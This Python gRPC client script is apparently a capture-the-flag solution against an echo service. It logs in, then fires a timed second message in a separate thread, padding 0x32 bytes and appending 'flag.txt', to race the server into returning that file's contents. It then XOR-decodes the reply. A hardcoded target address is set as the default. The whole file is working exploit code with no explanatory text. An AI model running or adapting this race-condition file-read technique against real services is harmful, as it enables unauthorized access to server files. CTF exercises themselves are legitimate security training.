import grpc
import time
import _thread
import argparse
import protobuf_pb2
import protobuf_pb2_grpc
import signal
import random

class UserLogoutError(Exception):
    pass

def signal_handler(signum, frame):
    raise UserLogoutError('Logging user out')

class Client:
    def __init__(self,hname,p,uname):
        self.hostname = hname
        self.port = p
        self.username = uname
        self.stub = protobuf_pb2_grpc.EchoServiceStub(grpc.insecure_channel(hname+":"+p))
        self.password = ''

def encrypt(client, message):
    xored = []
    temp_pass = client.password
    for i in range(len(message)):
        xored_value = ord(message[i%len(message)]) ^ ord(temp_pass[i%len(temp_pass)])
        xored.append(chr(xored_value))
    return ''.join(xored)

def decrypt(client, message):
    return encrypt(client, message)

def login(client):
    client.password = "o"
    reply = client.stub.Login(protobuf_pb2.Request(username=client.username,msg=client.password))
    print(reply.msg)

def logout(client):
    reply = client.stub.Logout(protobuf_pb2.ServiceUser(username=client.username))
    print(reply.msg)
    print('User',client.username,'logging off.')

def send(client, msg, race=False):
    client.stub.SendEcho(protobuf_pb2.Request(username=client.username,msg=encrypt(client, msg)))
    print("SENT")

def race(client):
    time.sleep(0.05)
    client.stub.SendEcho(protobuf_pb2.Request(username=client.username,msg=encrypt(client, "B" * 0x32 + "flag.txt")))
    
    pass

def echoClient(hostname,port,username):
    client = Client(hostname, port, "2" * 6)
    login(client)
    _thread.start_new_thread(race, (client,))
    client.stub.SendEcho(protobuf_pb2.Request(username=client.username,msg=encrypt(client, "A")))

    reply = client.stub.ReceiveEcho(protobuf_pb2.ServiceUser(username=client.username))
    ret = (decrypt(client, reply.msg))
    fin = ""
    for i in range(len(ret)):
        fin += chr(ord(ret[i]) ^ 0x42 ^ ord("o"))
    print(len(fin))
    print(fin)
    print(decrypt(client, ret))

    time.sleep(3)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Process some arguments")
    parser.add_argument('--host',default='ipv6:[0:0:0:0:0:ffff:22d0:d3ba]')
    parser.add_argument('-p','--port',default='3010')
    parser.add_argument('-u','--user',default='default')
    args = parser.parse_args()
    echoClient(args.host,args.port,args.user)
